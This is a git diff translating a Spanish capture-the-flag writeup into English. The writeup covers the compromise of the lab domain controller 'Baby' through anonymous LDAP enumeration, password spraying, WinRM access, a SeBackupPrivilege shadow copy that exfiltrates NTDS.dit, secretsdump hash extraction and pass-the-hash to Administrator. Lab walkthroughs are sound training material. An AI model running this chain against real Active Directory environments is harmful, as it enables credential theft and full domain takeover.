@@ -1,6 +1,6 @@
 ﻿# Writeup: Baby
 
->Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:
+>First we perform an Nmap scan of the TCP ports of the victim machine:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -38,14 +38,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 82.02 seconds
 ```
 
->Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:
+>We add the domain names found in the scan to the local resolver in order to resolve their DNS names:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
 └─$ echo "10.129.29.150 baby.vl BABYDC babydc.baby.vl" >> /etc/hosts
 ```
 
->Enumeramos con netexec datos del DC:
+>We list with netexec DC data:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -54,7 +54,7 @@ SMB         10.129.29.150   445    BABYDC           [*] Windows Server 2022 Buil
 SMB         10.129.29.150   445    BABYDC           [+] baby.vl\:
 ```
 
->Vemos que por LDAP podemos hacer consultas con **Null Session** donde descubrimos, por ejemplo, todos los usuarios del dominio, aquí vemos que en la descripción del usuario **Teresa.Bell** tenemos la contraseña **BabyStar123!**:
+>We see that by LDAP we can make queries with **Null Session** where we discover, for example, all the users of the domain, here we see that in the description of the user **Teresa.Bell** we have the password **BabyStar123!**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -74,7 +74,7 @@ LDAP        10.129.29.150   389    BABYDC           Kerry.Wilson                
 LDAP        10.129.29.150   389    BABYDC           Teresa.Bell                   2021-11-21 10:14:37 0        Set initial password to BabyStart123!     
 ```
 
->Comprobamos las credenciales pero no son válidas: `teresa.bell:BabyStart123!`
+>We checked the credentials but they are not valid: `teresa.bell:BabyStart123!`
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -83,7 +83,7 @@ SMB         10.129.29.150   445    BABYDC           [*] Windows Server 2022 Buil
 SMB         10.129.29.150   445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE 
 ```
 
->Hacemos **password spray** con las credenciales obtenidas, pero no vemos ningún match:
+>We do **password spray** with the credentials obtained, but we do not see any matches:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -103,7 +103,7 @@ Version: dev (n/a) - 01/01/26 - Ronnie Flathers @ropnop
 2026/01/01 11:46:42 >  Done! Tested 9 logins (0 successes) in 0.140 seconds
 ```
 
->Seguimos enumerando por LDAP y obtenemos una lista más cierta de los usuarios del directorio activo:
+>We continue to list by LDAP and get a truer list of active directory users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -146,7 +146,7 @@ dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
 dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
 ```
 
->Vemos que con esta enumeración obtuvimos más usuarios del dominio:
+>We see that with this enumeration we obtained more users of the domain:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -161,7 +161,7 @@ dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
 > Caroline.Robinson
 ```
 
->Rehacemos el **password spray** con una lista mayor y vemos que tenemos las credenciales: `Caroline.Robinson:BabyStart123!`
+>We redo the **password spray** with a larger list and see that we have the credentials: `Caroline.Robinson:BabyStart123!`
 
 ```bash 
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -182,7 +182,7 @@ Version: dev (n/a) - 01/01/26 - Ronnie Flathers @ropnop
 2026/01/01 11:53:04 >  Done! Tested 13 logins (1 successes) in 0.144 seconds
 ```
 
->Vemos que el usuario debe cambiar sus credenciales por la flag **STATUS_PASSWORD_MUST_CHANGE**:
+>We see that the user must change their credentials by the flag **STATUS_PASSWORD_MUST_CHANGE**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -191,7 +191,7 @@ SMB         10.129.29.150   445    BABYDC           [*] Windows Server 2022 Buil
 SMB         10.129.29.150   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! **STATUS_PASSWORD_MUST_CHANGE**
 ```
 
->Cambiamos la contraseña de **Caroline.Robinson** con **changepasswd.py** de Impacket:
+>We changed **Caroline.Robinson** password using **changepasswd.py** from Impacket:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -204,7 +204,7 @@ Current password:
 [*] Password was changed successfully.
 ```
 
->Vamos a dumpear el contenido del dominio mediante LDAP:
+>Let's dump the domain content using LDAP:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -216,12 +216,12 @@ Current password:
 [+] Domain dump finished
 ```
 
->Aquí vemos que **caroline.robinson** puede entrar por **WinRM** ya que pertenece al grupo **Remote Management Users**:
+>Here we see that **caroline.robinson** can enter through **WinRM** since it belongs to the **Remote Management Users** group:
 
 <img width="809" height="105" alt="image" src="https://github.com/user-attachments/assets/889a2fe9-3cb7-450c-9f08-72bbc2c9868d" />
 <img width="1247" height="265" alt="image" src="https://github.com/user-attachments/assets/cc711f54-cb5e-4e18-843b-ac761f945a79" />
 
->Entramos por **WinRM** empleando las credenciales de **caroline.robinson** y leemos la primera flag:
+>We enter by **WinRM** using the credentials of **caroline.robinson** and read the first flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -238,7 +238,7 @@ Info: Establishing connection to remote endpoint
 873a6705eca1355237438965041d3897
 ```
 
->Vemos que posee el token **SeBackupPrivilege** que nos permitirá **escalar privilegios**:
+>We see that we have the **SeBackupPrivilege** token that will allow us to **escalate privileges**:
 
 ```bash
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv
@@ -256,14 +256,14 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
->Importamos los siguientes DLL que ayudan a explotar el token: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets
+>We import the following DLLs that help exploit the token: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets
 
 ```bash
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
 ```
 
->Hacemos una **shadow copy** del disco C: para robarnos posteriormente el **NTDS.dit**:
+>We make a **shadow copy** of disk C: to later steal the **NTDS.dit**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -366,7 +366,7 @@ The shadow copy was successfully exposed as E:\.
 -> exit
 ```
 
->Ahora **copiamos** el **NTDS.dit** de la **shadow copy** con los cmdlets de los dll importados anteriormente:
+>Now **we copy** the **NTDS.dit** of the **shadow copy** with the cmdlets of the previously imported DLLs:
 
 ```bash
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\Caroline.Robinson\Desktop\ntds.dit
@@ -388,7 +388,7 @@ Mode                 LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> download ntds.dit
 ```
 
->Ahora obtenemos la **registry hive SYSTEM** para poder extraer el contenido del **NTDS.dit**: 
+>Now we get the **registry hive SYSTEM** to be able to extract the contents of the **NTDs.dit**:
 
 ```bash
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> reg save HKLM\SYSTEM SYSTEM.SAV
@@ -397,7 +397,7 @@ The operation completed successfully.
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> download SYSTEM.SAV
 ```
 
->Por último, con **secretsdump.py** vamos a extraer los hashes **NTLM** de **todos los usuarios del dominio** de la base de datos **NTDS.dit**:
+>Finally, with **secretsdump.py** we are going to extract the **NTLM** hashes of **all the users of the domain** from the **NTDS.dit** database:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
@@ -466,7 +466,7 @@ baby.vl\Caroline.Robinson:des-cbc-md5:2f58981c895d1968
 [*] Cleaning up... 
 ```
 
->Ahora podemos entrar con **evil-winrm** mediante **Pass-The-Hash** para leer la flag final como el **Administrador**:
+>Now we can enter with **evil-winrm** using **Pass-The-Hash** to read the final flag as the **Admininistrator**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
